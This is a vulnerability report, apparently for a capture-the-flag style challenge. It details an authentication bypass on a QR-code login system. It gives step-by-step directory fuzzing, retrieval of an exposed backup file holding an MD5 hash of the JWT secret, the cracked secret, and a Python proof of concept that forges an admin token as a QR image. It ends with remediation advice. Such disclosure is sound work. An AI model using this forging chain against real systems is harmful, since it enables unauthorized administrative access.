**Summary**

Authentication bypass via weak JWT secret exposed in a backup configuration file, allowing privilege escalation to admin using a forged QR code.

---

**Description**

The application uses QR-based authentication where each QR code encodes a JWT token.

During reconnaissance, a publicly accessible backup file was discovered at:

`/backups/config.bak`

This file contained a deprecated JWT key hash.

By cracking this hash (MD5), the original secret (`superman`) was recovered.

Since the application blindly trusts JWT tokens embedded inside QR codes without additional validation, an attacker can forge a new token with elevated privileges (`is_admin: true`), convert it into a QR code, and gain administrative access.

This results in a complete authentication bypass.

---

**Steps to Reproduce**

1. Access guest QR:
   https://qrchall.4hats.app/get_guest_pass

2. Decode the QR code → extract JWT token

3. Analyze JWT (e.g. jwt.io):

```
{
  "name": "guest",
  "is_admin": false
}
```

4. Perform directory fuzzing:

```
dirsearch -u https://qrchall.4hats.app/
```

5. Discover backup file:

```
/backups/config.bak
```

6. Extract hash:

```
84d961568a65073a3bcf0eb216b2a576
```

7. Crack hash (MD5):

```
superman
```

8. Forge admin JWT using recovered secret

9. Convert JWT to QR code

10. Upload QR → gain admin access

---

**Request**

```
GET /backups/config.bak HTTP/1.1
Host: qrchall.4hats.app
```

---

**Response**

```
[JWT_SETTINGS]
ALGORITHM = HS256
DEPRECATED_KEY_HASH = 84d961568a65073a3bcf0eb216b2a576
AUTH_PROVIDER = Internal_Legacy
```

---

**Impact**

* Full authentication bypass
* Privilege escalation to admin
* Unauthorized access to sensitive functionality
* Potential full system compromise

---

**Affected Endpoint(s)**

* /get_guest_pass
* /backups/config.bak
* QR authentication endpoint

---

**Vulnerability Details**

* Sensitive backup file exposed
* Weak secret stored as crackable hash (MD5)
* No protection against JWT forging
* Trusting client-controlled QR tokens without verification

---

**Proof of Concept (PoC)**

```python
import jwt
import qrcode

payload = {
    "name": "admin",
    "is_admin": True
}

secret = "superman"

token = jwt.encode(payload, secret, algorithm="HS256")

img = qrcode.make(token)
img.save("admin.png")

print(token)
```

---

**Recommendation (Fix)**

* Remove public access to backup/config files
* Use strong, non-guessable secrets
* Avoid storing secrets as weak hashes (MD5)
* Implement server-side validation for roles
* Add additional verification layer for QR authentication
* Rotate compromised secrets immediately

---

**Severity**

**Critical**

**Reason:** Full authentication bypass and privilege escalation to admin.

---

**Additional Information**

The vulnerability chain combines:

* Information disclosure
* Weak cryptography
* Broken authentication logic

---

**Reporter**

Name: khaled waled

Handle(github): khaledvvaled  